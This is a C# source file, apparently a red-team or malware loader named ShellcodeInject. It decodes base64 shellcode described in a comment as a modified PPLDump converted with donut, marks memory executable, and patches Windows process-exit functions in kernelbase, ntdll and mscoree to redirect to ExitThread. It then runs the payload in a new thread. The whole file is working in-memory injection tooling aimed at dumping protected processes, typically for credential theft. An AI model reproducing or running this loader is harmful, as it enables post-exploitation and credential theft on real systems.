using System;
using System.Runtime.InteropServices;
using System.Collections.Generic;

namespace ShellcodeInject
{
    public class Program
    {


        // Exitpatcher function stolen from From Nettitudes RunPE -> https://github.com/nettitude/RunPE 

        internal const uint PAGE_EXECUTE_READWRITE = 0x40;

        [DllImport("kernel32.dll")]
        internal static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpFlOldProtect);

        internal static byte[] PatchFunction(string dllName, string funcName, byte[] patchBytes)
        {

            var moduleHandle = GetModuleHandle(dllName);
            var pFunc = GetProcAddress(moduleHandle, funcName);

            var originalBytes = new byte[patchBytes.Length];
            Marshal.Copy(pFunc, originalBytes, 0, patchBytes.Length);


            var result = VirtualProtect(pFunc, (UIntPtr)patchBytes.Length, PAGE_EXECUTE_READWRITE, out var oldProtect);
            if (!result)
            {

                return null;
            }

            Marshal.Copy(patchBytes, 0, pFunc, patchBytes.Length);


            result = VirtualProtect(pFunc, (UIntPtr)patchBytes.Length, oldProtect, out _);
            if (!result)
            {
            }

            return originalBytes;
        }

        private byte[] _terminateProcessOriginalBytes;
        private byte[] _ntTerminateProcessOriginalBytes;
        private byte[] _rtlExitUserProcessOriginalBytes;
        private byte[] _corExitProcessOriginalBytes;

        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        internal static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        internal static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        internal bool PatchExit()
        {


            var hKernelbase = GetModuleHandle("kernelbase");
            var pExitThreadFunc = GetProcAddress(hKernelbase, "ExitThread");

            var exitThreadPatchBytes = new List<byte>() { 0x48, 0xC7, 0xC1, 0x00, 0x00, 0x00, 0x00, 0x48, 0xB8 };
            /*
                mov rcx, 0x0 #takes first arg
                mov rax, <ExitThread> # 
                push rax
                ret
             */
            var pointerBytes = BitConverter.GetBytes(pExitThreadFunc.ToInt64());

            exitThreadPatchBytes.AddRange(pointerBytes);

            exitThreadPatchBytes.Add(0x50);
            exitThreadPatchBytes.Add(0xC3);

            _terminateProcessOriginalBytes =
                PatchFunction("kernelbase", "TerminateProcess", exitThreadPatchBytes.ToArray());
            if (_terminateProcessOriginalBytes == null)
            {
                return false;
            }
            _corExitProcessOriginalBytes =
                PatchFunction("mscoree", "CorExitProcess", exitThreadPatchBytes.ToArray());
            if (_corExitProcessOriginalBytes == null)
            {
                return false;
            }

            _ntTerminateProcessOriginalBytes =
                PatchFunction("ntdll", "NtTerminateProcess", exitThreadPatchBytes.ToArray());
            if (_ntTerminateProcessOriginalBytes == null)
            {
                return false;
            }


            _rtlExitUserProcessOriginalBytes =
                PatchFunction("ntdll", "RtlExitUserProcess", exitThreadPatchBytes.ToArray());
            if (_rtlExitUserProcessOriginalBytes == null)
            {
                return false;
            }

            return true;
        }

        internal void ResetExitFunctions()
        {

            PatchFunction("kernelbase", "TerminateProcess", _terminateProcessOriginalBytes);

            PatchFunction("mscoree", "CorExitProcess", _corExitProcessOriginalBytes);

            PatchFunction("ntdll", "NtTerminateProcess", _ntTerminateProcessOriginalBytes);

            PatchFunction("ntdll", "RtlExitUserProcess", _rtlExitUserProcessOriginalBytes);

        }

        private delegate IntPtr GetPebDelegate();


        [DllImport("kernel32")]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr param, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32")]
        public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);


        public static void Inject()
        {
            // Slightly modified PPLDump.exe converted to shellcode via donut.
            byte[] buf1 = Convert.FromBase64String(pplDumpshellcodebase64);
            uint num;
            IntPtr pointer = Marshal.AllocHGlobal(buf1.Length);
            Marshal.Copy(buf1, 0, pointer, buf1.Length);
            VirtualProtect(pointer, new UIntPtr((uint)buf1.Length), (uint)0x40, out num);

            var mc = new Program();

            bool patched = mc.PatchExit();
            Console.WriteLine("\r\nExit functions patched: " + patched + "\r\n\r\n");

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, pointer, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(hThread, 0xFFFFFFFF);

            Console.WriteLine("Thread Complete");

            mc.ResetExitFunctions();


        }

    }
}